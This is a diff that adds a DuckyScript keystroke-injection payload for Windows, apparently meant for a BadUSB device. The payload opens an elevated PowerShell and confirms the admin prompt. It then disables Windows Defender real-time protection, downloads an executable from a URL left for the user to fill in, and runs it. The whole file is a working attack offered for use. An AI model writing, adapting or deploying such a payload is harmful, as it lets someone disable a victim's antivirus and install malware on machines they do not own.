@@ -1,0 +1,19 @@
+REM Title: Download And Evade AV
+REM Author: ScreamsTerror
+REM Description: Turns off AV Then Downloads payload 
+REM Target: Windows 
+REM Delete '' And put URL
+
+DELAY 100
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 200
+STRING iwr -Uri '' -O upl.exe;Start-Sleep 1;Start upl.exe;exit
+ENTER
